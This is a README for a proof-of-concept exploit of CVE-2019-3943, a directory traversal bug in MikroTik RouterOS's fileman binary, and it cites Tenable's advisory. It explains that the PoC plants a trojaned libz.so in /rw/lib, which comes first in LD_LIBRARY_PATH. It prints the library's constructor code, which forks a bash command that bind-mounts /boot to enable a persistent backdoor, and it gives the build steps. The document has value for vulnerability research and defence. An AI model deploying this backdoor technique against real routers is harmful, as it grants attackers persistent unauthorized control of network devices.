# CVE-2019-3943 /rw/lib Proof of Concept

This is an implementation of CVE-2019-3943 which is a directory traversal vulnerability affecting the fileman binary in Router OS. This vulnerability was patched in 6.44RC1. See Tenable's advisory at: https://www.tenable.com/security/research/tra-2019-16 

The PoC creates the directory /rw/lib and uploads a MIPSBE shared object called libz.so. The shared object actually is libz.so but I've added a constructor that does this:

```
void __attribute__((constructor)) lol(void)
{
    int fork_result = fork();
    if (fork_result == 0)
    {
        execl("/bin/bash", "bash", "-c", "mkdir /pckg/option; mount -o bind /boot/ /pckg/option", (char *) 0);
        exit(0);
    }
}
```

Why? Because of this:

```
BusyBox v1.00 (2019.07.17-09:35+0000) Built-in shell (ash)
Enter 'help' for a list of built-in commands.

# echo $LD_LIBRARY_PATH
/rw/lib:/pckg/security/lib:/pckg/dhcp/lib:/pckg/ppp/lib:/pckg/mpls/lib:/pckg/hotspot/lib:/pckg/wireless/lib:/lib
# 
```

That's right! /rw/lib/ is the first entry in the LD_LIBRARY_PATH. Anyone that loads up libz.so (there are a few) will execute the constructor and enable the back door.

Again. **This is a MIPSBE shared object!** Don't upload it on a non-MIPSBE device. /rw/lib is persistent memory and you'll have a bad time.

## What are the build dependencies?

This requires:

* Boost 1.66 or higher
* cmake

## How do I build this jawn?

Just normal cmake. Try this:

```sh
mkdir build
cd build
cmake ..
make
```

Resolve dependencies as needed.

